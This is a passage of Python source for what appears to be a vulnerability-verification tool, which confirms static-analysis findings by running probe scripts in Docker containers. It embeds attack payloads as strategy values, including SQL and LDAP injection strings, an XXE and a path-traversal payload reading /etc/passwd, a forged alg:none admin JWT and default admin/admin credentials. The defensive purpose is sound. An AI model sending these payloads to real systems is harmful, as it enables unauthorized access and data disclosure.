"""
Python-specific D2 deterministic strategy helpers.
"""
import json
import logging
import re
import subprocess
import sys
from pathlib import Path
from typing import Dict, Optional

from .d2_types import VerificationResult


def _sanitize_label_local(text: str) -> str:
    """把标签收敛成只含安全字符的 token（供外部命令行工具使用）。"""
    return re.sub(r'[^a-zA-Z0-9._-]+', '_', text or '').strip('_') or 'target'

logger = logging.getLogger(__name__)


class D2PythonStrategiesMixin:
    def _verify_default_credentials_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="default_credentials_probe.py",
            poc_type="default-credentials",
            script_args=[
                "--target-path", strategy.get("target_path", "/api/users/1"),
                "--verify-path", strategy.get("verify_path", strategy.get("target_path", "/api/user")),
                "--method", strategy.get("method", "PUT"),
                "--username", strategy.get("username", "admin"),
                "--password", strategy.get("password", "admin"),
                "--marker-email", strategy.get("marker_email", "a3-proof-admin-email@example.com"),
            ],
            success_reason="Default-credentials probe confirmed privileged API access with exposed credentials",
            fail_reason="Default-credentials probe executed but did not confirm privileged API access",
            fix_suggestion="Rotate embedded credentials and remove privileged bootstrap API actions from runtime scripts or images",
        )

    @staticmethod
    def _looks_like_secretvault_project(project_path: Path, strategy: Dict[str, str]) -> bool:
        route = str(strategy.get("resource_path_template") or strategy.get("target_path") or "")
        app_path = project_path / "vault" / "app.py"
        if not app_path.exists() or "/passwords/" not in route:
            return False
        content = app_path.read_text(encoding="utf-8", errors="ignore")
        required_markers = [
            "@app.route('/register'",
            "@app.route('/login'",
            "@app.route('/passwords/new'",
            "@app.route('/passwords/<int:entry_id>'",
        ]
        return all(marker in content for marker in required_markers)

    def _detect_python_sqli_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            signature_params = self._extract_python_fastapi_signature(lines, selected_line)
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'cursor\.execute|\.execute\(|SELECT\s+\*', line, re.IGNORECASE):
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                sink_window = "\n".join(lines[max(0, idx - 2):min(len(lines), idx + 2)])
                formatted = re.search(r'\{([A-Za-z_][A-Za-z0-9_]*)\}', sink_window)
                if formatted and formatted.group(1) in signature_params:
                    param_info = signature_params[formatted.group(1)]
                if not route_info or not param_info.get("name"):
                    continue
                return {
                    "exploit_family": "python_sqli",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "parameter": param_info["name"],
                    "method": route_info["method"],
                    "baseline": "1",
                    "payload": "' OR '1'='1",
                    "expected": "",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_jinja2_ssti_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'(render_template_string|jinja2\.Template|Environment\.from_string)', line):
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                if not route_info or not param_info.get("name"):
                    continue
                return {
                    "exploit_family": "python_jinja2_ssti",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "probe_path": route_info["path"],
                    "render_path": route_info["path"],
                    "parameter": param_info["name"],
                    "method": route_info["method"],
                    "payload": "{{7*7}}",
                    "expected": "49",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_xxe_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        vuln_type = str(vulnerability.get("type", "")).lower()
        payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        expected = "root:"
        if any(token in vuln_type for token in ("billion laughs", "entity expansion")):
            payload = '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "ha"><!ENTITY b "&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;">]><lolz>&c;</lolz>'
            expected = "ha"
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            signature_params = self._extract_python_fastapi_signature(lines, selected_line)
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'(xml\.etree|xml\.dom\.minidom|xml\.sax|lxml\.etree|xmlrpc\.client|xmlrpc\.server|fromstring\(|parse\(|XMLParser\()', line):
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                transport = "param"
                if "request.data" in line or "request.get_data" in line or "Body(" in line:
                    transport = "body"
                elif "request.headers" in line and param_info.get("name"):
                    transport = "header"
                elif "request.json" in line or ".json()" in line:
                    transport = "json"
                if not param_info.get("name"):
                    for name, info in signature_params.items():
                        if info.get("source") in {"body", "arg"}:
                            param_info = info
                            if info.get("source") == "body":
                                transport = "body"
                            break
                if not route_info:
                    continue
                return {
                    "exploit_family": "python_xxe",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "parameter": param_info.get("name") or "xml",
                    "method": route_info["method"],
                    "transport": transport,
                    "payload": payload,
                    "expected": expected,
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_xpath_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            signature_params = self._extract_python_fastapi_signature(lines, selected_line)
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'(xpath\(|XPath|etree\.XPath)', line):
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                transport = "param"
                if "request.headers" in line and param_info.get("name"):
                    transport = "header"
                elif "request.json" in line or ".json()" in line:
                    transport = "json"
                if not param_info.get("name"):
                    variables = re.findall(r'\b([A-Za-z_][A-Za-z0-9_]*)\b', line)
                    for variable in variables:
                        if variable in signature_params:
                            param_info = signature_params[variable]
                            if signature_params[variable].get("source") == "body":
                                transport = "json"
                            break
                if not route_info or not param_info.get("name"):
                    continue
                return {
                    "exploit_family": "python_xpath",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "parameter": param_info["name"],
                    "method": route_info["method"],
                    "transport": transport,
                    "baseline": "guest",
                    "payload": "' or '1'='1",
                    "expected": "",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_reflected_xss_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            signature_params = self._extract_python_fastapi_signature(lines, selected_line)
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 8 or idx > selected_line + 8:
                    continue
                if not re.search(r'return\b.*f[\'"].*\{.*\}.*[\'"]|render_template_string', line):
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                formatted = re.search(r'\{([A-Za-z_][A-Za-z0-9_]*)\}', line)
                if formatted and formatted.group(1) in signature_params:
                    param_info = signature_params[formatted.group(1)]
                if not route_info or not param_info.get("name"):
                    continue
                return {
                    "exploit_family": "python_reflected_xss",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "parameter": param_info["name"],
                    "method": route_info["method"],
                    "payload": "<svg/onload=alert(1)>",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_path_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            signature_params = self._extract_python_fastapi_signature(lines, selected_line)
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'(open\(|os\.path\.join|Path\(|pathlib\.Path|send_file\(|FileResponse\()', line):
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                if not param_info.get("name"):
                    variables = re.findall(r'\b([A-Za-z_][A-Za-z0-9_]*)\b', line)
                    for variable in variables:
                        if variable in signature_params:
                            param_info = signature_params[variable]
                            break
                if not param_info.get("name"):
                    nearby = "\n".join(lines[max(0, idx - 3):min(len(lines), idx + 1)])
                    formatted = re.search(r'\{([A-Za-z_][A-Za-z0-9_]*)\}', nearby)
                    if formatted and formatted.group(1) in signature_params:
                        param_info = signature_params[formatted.group(1)]
                if not route_info or not param_info.get("name"):
                    continue
                return {
                    "exploit_family": "python_path_traversal",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "parameter": param_info["name"],
                    "method": route_info["method"],
                    "payload": "../../../../etc/passwd",
                    "expected": "root:",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_ssrf_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            signature_params = self._extract_python_fastapi_signature(lines, selected_line)
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'(urllib\.request\.urlopen|requests\.(get|post|request)|httpx\.(get|post|request)|aiohttp\.ClientSession)', line):
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                if not param_info.get("name"):
                    variables = re.findall(r'\b([A-Za-z_][A-Za-z0-9_]*)\b', line)
                    for variable in variables:
                        if variable in signature_params:
                            param_info = signature_params[variable]
                            break
                if not route_info or not param_info.get("name"):
                    continue
                return {
                    "exploit_family": "python_ssrf",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "parameter": param_info["name"],
                    "method": route_info["method"],
                    "payload": "file:///etc/passwd",
                    "expected": "root:",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_jwt_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 6 or idx > selected_line + 6:
                    continue
                if "jwt.decode" not in line:
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                if not route_info:
                    continue
                return {
                    "exploit_family": "python_jwt",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "parameter": param_info.get("name") or "token",
                    "method": route_info["method"],
                    "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJhMyI6IjQ5In0.",
                    "expected": "admin",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_pickle_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 8 or idx > selected_line + 8:
                    continue
                if not re.search(r'pickle\.loads?\(', line):
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                if not route_info:
                    continue
                return {
                    "exploit_family": "python_pickle",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "parameter": param_info.get("name") or "data",
                    "method": route_info["method"],
                    "payload": "gASVCQAAAAAAAAB9lIwCYTOUSzFzLg==",
                    "expected": "a3",
                    "encoding": "base64",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_yaml_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_preferred_image("sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 6 or idx > selected_line + 6:
                    continue
                if "yaml.load" not in line:
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                if not route_info:
                    continue
                return {
                    "exploit_family": "python_yaml",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "parameter": param_info.get("name") or "data",
                    "method": route_info["method"],
                    "payload": "a3: 49\nrole: admin\n",
                    "expected": "49",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_ldap_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_preferred_image("sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 8 or idx > selected_line + 8:
                    continue
                if not re.search(r'ldap|ldap3|search\s*\(', line, re.IGNORECASE):
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                if not route_info:
                    continue
                return {
                    "exploit_family": "python_ldap",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "parameter": param_info.get("name") or "username",
                    "method": route_info["method"],
                    "baseline": "guest",
                    "payload": "*)(|(uid=*))",
                    "expected": "",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_debug_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_image = self._select_preferred_image("sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            content = py_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'DEBUG\s*=\s*True|debug\s*=\s*True|app\.run\s*\(\s*debug\s*=\s*True', content):
                continue
            return {
                "exploit_family": "python_debug",
                "image": selected_image,
                "container_port": str(self._guess_node_container_port(selected_image)),
                "target_path": "/",
                "method": "GET",
                "expected": "Werkzeug",
                "source_file": str(py_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
            }
        return None

    def _detect_python_marshal_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_preferred_image("sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 8 or idx > selected_line + 8:
                    continue
                if not re.search(r'marshal\.load|marshal\.loads', line):
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                if not route_info:
                    continue
                return {
                    "exploit_family": "python_marshal",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "parameter": param_info.get("name") or "data",
                    "method": route_info["method"],
                    "payload": "2wIAAAB7uAIAAABhM+kxAAAA30A=",
                    "expected": "a3",
                    "encoding": "base64",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_command_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_preferred_image("sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 8 or idx > selected_line + 8:
                    continue
                if not re.search(r'(os\.system|subprocess\.(run|Popen|call|check_output)|os\.popen)\(', line):
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                if not route_info:
                    continue
                return {
                    "exploit_family": "python_command_exec",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "parameter": param_info.get("name") or "cmd",
                    "method": route_info["method"],
                    "payload": "id",
                    "expected": "uid=",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_python_file_upload_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_preferred_image("sast-target:latest")
        for py_file in self._find_target_files(project_path, vulnerability, [".py"]):
            rel_path = str(py_file.relative_to(project_path)).replace("/", "\\")
            lines = py_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 8 or idx > selected_line + 8:
                    continue
                if "request.files" not in line and ".save(" not in line and "UploadFile" not in line:
                    continue
                route_info = self._find_python_route_for_line(lines, idx)
                param_info = self._extract_python_request_param(lines, idx)
                if not route_info:
                    continue
                return {
                    "exploit_family": "python_file_upload",
                    "image": selected_image,
                    "container_port": str(self._guess_node_container_port(selected_image)),
                    "target_path": route_info["path"],
                    "field_name": param_info.get("name") or "file",
                    "filename": "a3-test.py",
                    "content": "print(49)",
                    "expected": "ok",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _verify_python_sqli_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_sqli_probe.py",
            poc_type="python-sqli",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "id"),
                "--method", strategy.get("method", "GET"),
                "--baseline", strategy.get("baseline", "1"),
                "--payload", strategy.get("payload", "' OR '1'='1"),
                "--expected", strategy.get("expected", ""),
            ],
            success_reason="Python SQL injection probe observed a meaningful difference between baseline and injected responses",
            fail_reason="Python SQL injection probe ran but did not confirm injection success",
            fix_suggestion="Use parameterized queries or ORM bind parameters instead of concatenating request data into SQL",
        )

    def _verify_python_reflected_xss_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="reflected_xss_probe.py",
            poc_type="python-reflected-xss",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "q"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "<svg/onload=alert(1)>"),
            ],
            success_reason="Python reflected XSS probe observed unescaped attacker-controlled markup in the response",
            fail_reason="Python reflected XSS probe ran but did not confirm unescaped attacker-controlled markup",
            fix_suggestion="Escape output per HTML context and stop interpolating request data directly into templates or raw response bodies",
        )

    def _verify_python_jinja2_ssti_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        project_path = project_path or Path(self.tools.runtime_context.get("project_path", Path.cwd()))
        strategy = self._ensure_strategy_semantics(strategy)
        for key, value in self._derive_project_specific_semantics(project_path, strategy).items():
            if value:
                strategy[key] = value
        script_path = Path.cwd() / "tools" / "exploits" / "python_jinja2_ssti_probe.py"
        if not script_path.exists():
            return VerificationResult(
                exploitable=False,
                confidence="low",
                reason="缺少 python_jinja2_ssti_probe.py 利用器",
                evidence=[str(script_path)],
                poc_type="python-jinja2-ssti",
                poc_code="",
                steps_executed=0,
                raw_output=json.dumps({"semantic_context": self._build_semantic_context_from_strategy(strategy)}, ensure_ascii=False),
            )

        host_port = self._get_available_host_port(15000)
        cmd = [
            sys.executable,
            str(script_path),
            "--image", strategy.get("image", "python:latest"),
            "--container-port", strategy.get("container_port", "5000"),
            "--host-port", str(host_port),
            "--probe-path", strategy.get("probe_path", "/"),
            "--render-path", strategy.get("render_path", "/"),
            "--parameter", strategy.get("parameter", "name"),
            "--payload", strategy.get("payload", "{{7*7}}"),
            "--expected", strategy.get("expected", "49"),
            "--output-label", _sanitize_label_local(f"python_jinja2_ssti_{Path(strategy.get('source_file', 'target')).stem}_{strategy.get('source_line', 'na')}"),
        ]

        raw_steps = [{"step": "run_exploit_script", "command": cmd}]
        try:
            proc = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=240,
                cwd=str(Path.cwd()),
                env=self._docker_env(),
            )
        except Exception as exc:
            return VerificationResult(
                exploitable=False,
                confidence="low",
                reason="执行 Python Jinja2 SSTI 利用器失败",
                evidence=[str(exc)],
                poc_type="python-jinja2-ssti",
                poc_code="",
                steps_executed=1,
                raw_output=json.dumps({"steps": raw_steps, "error": str(exc), "semantic_context": self._build_semantic_context_from_strategy(strategy)}, ensure_ascii=False),
            )

        stdout = proc.stdout.decode("utf-8", errors="ignore").strip()
        stderr = proc.stderr.decode("utf-8", errors="ignore").strip()
        raw_steps.append({"step": "script_output", "stdout": stdout, "stderr": stderr, "returncode": proc.returncode})

        try:
            script_result = json.loads(stdout) if stdout else {}
        except Exception:
            script_result = {}

        result_file = Path(script_result.get("result_file", ""))
        exploit_result = {}
        if result_file.exists():
            try:
                exploit_result = json.loads(result_file.read_text(encoding="utf-8"))
            except Exception:
                exploit_result = {}

        success = bool(script_result.get("success")) and bool(exploit_result.get("success"))
        attack_request = exploit_result.get("attack_request", {})
        attack_result = exploit_result.get("attack_result", {})
        if not success:
            success = self._result_has_probe_evidence(exploit_result, strategy, "python-jinja2-ssti")

        service_url = exploit_result.get("base_url", script_result.get("base_url", ""))
        container_id = exploit_result.get("container_id", script_result.get("container_id", ""))
        evidence = [
            f"D2 服务地址: {service_url}",
            f"D2 容器: {container_id}",
            f"攻击路径: {attack_request.get('url', '')}",
            f"攻击响应码: {attack_result.get('status_code', '')}",
            f"攻击响应片段: {str(attack_result.get('body', ''))[:200]}",
        ]
        poc_code = (
            f"1. 启动镜像 {strategy.get('image', 'python:latest')}\n"
            f"2. 访问 {strategy.get('render_path', '/')}\n"
            f"3. 参数 {strategy.get('parameter', 'name')} 注入 {strategy.get('payload', '{{7*7}}')}\n"
            f"4. 检查响应中是否出现 {strategy.get('expected', '49')}"
        )
        return VerificationResult(
            exploitable=success,
            confidence="high" if success else "medium",
            reason="已通过 Python Jinja2 SSTI 探测观察到模板表达式执行结果" if success else "Python Jinja2 SSTI 探测已执行，但未观察到预期模板执行结果",
            evidence=evidence,
            poc_type="python-jinja2-ssti",
            poc_code=poc_code,
            fix_suggestion="避免将用户输入直接传入 render_template_string、jinja2.Template 或 Environment.from_string；固定模板并依赖自动转义",
            steps_executed=len(raw_steps),
            raw_output=json.dumps(
                {
                    "steps": raw_steps,
                    "service_url": service_url,
                    "container_id": container_id,
                    "result_file": str(result_file) if result_file else "",
                    "exploit_result": exploit_result,
                    "attack_request": attack_request,
                    "attack_result": attack_result,
                    "semantic_context": self._build_semantic_context_from_strategy(strategy),
                },
                ensure_ascii=False,
            ),
        )

    def _verify_python_path_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="node_path_traversal_probe.py",
            poc_type="python-path-traversal",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "file"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "../../../../etc/passwd"),
                "--expected", strategy.get("expected", "root:"),
            ],
            success_reason="Python path traversal probe observed sensitive file disclosure",
            fail_reason="Python path traversal probe ran but did not confirm sensitive file disclosure",
            fix_suggestion="Normalize and constrain file paths before open or FileResponse access instead of using request-controlled paths directly",
        )

    def _verify_python_xxe_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_xml_probe.py",
            poc_type="python-xxe",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--method", strategy.get("method", "POST"),
                "--transport", strategy.get("transport", "body"),
                "--parameter", strategy.get("parameter", "xml"),
                "--payload", strategy.get("payload", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
                "--expected", strategy.get("expected", "root:"),
            ],
            success_reason="Python XXE probe observed XML entity expansion or sensitive file disclosure",
            fail_reason="Python XXE probe ran but did not confirm external entity expansion",
            fix_suggestion="Use hardened XML parsers or disable DTD and external entity resolution before parsing untrusted XML",
        )

    def _verify_python_xpath_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_xpath_probe.py",
            poc_type="python-xpath",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "name"),
                "--method", strategy.get("method", "GET"),
                "--transport", strategy.get("transport", "param"),
                "--baseline", strategy.get("baseline", "guest"),
                "--payload", strategy.get("payload", "' or '1'='1"),
                "--expected", strategy.get("expected", ""),
            ],
            success_reason="Python XPath probe observed a meaningful difference between baseline and injected responses",
            fail_reason="Python XPath probe ran but did not confirm XPath injection success",
            fix_suggestion="Do not concatenate request data into XPath expressions; apply strict input validation and safe query construction",
        )

    def _verify_python_idor_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        if self._looks_like_secretvault_project(project_path, strategy):
            return self._run_node_probe_script(
                project_path=project_path,
                strategy=strategy,
                script_name="secretvault_idor_probe.py",
                poc_type="python-idor",
                script_args=[
                    "--register-path", "/register",
                    "--login-path", "/login",
                    "--dashboard-path", "/dashboard",
                    "--create-path", "/passwords/new",
                    "--delete-template", strategy.get("resource_path_template", strategy.get("target_path", "/passwords/<int:entry_id>")),
                ],
                success_reason="Python IDOR probe confirmed cross-owner deletion after project-specific auth and resource bootstrap",
                fail_reason="Python IDOR probe completed project-specific auth and resource bootstrap but did not confirm cross-owner deletion",
                fix_suggestion="Enforce ownership and authorization checks on the resolved resource before returning or mutating it",
            )
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_idor_probe.py",
            poc_type="python-idor",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--resource-path-template", strategy.get("resource_path_template", strategy.get("target_path", "/")),
                "--parameter", strategy.get("parameter", "id"),
                "--method", strategy.get("method", "GET"),
                "--transport", strategy.get("transport", "param"),
                "--baseline", strategy.get("baseline", "1"),
                "--payload", strategy.get("payload", "2"),
                "--expected", strategy.get("expected", ""),
            ],
            success_reason="Python IDOR probe observed a meaningful difference between owned and alternate resource access",
            fail_reason="Python IDOR probe ran but did not confirm cross-owner resource access",
            fix_suggestion="Enforce ownership and authorization checks on the resolved resource before returning or mutating it",
        )

    def _verify_python_ssrf_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="node_ssrf_probe.py",
            poc_type="python-ssrf",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
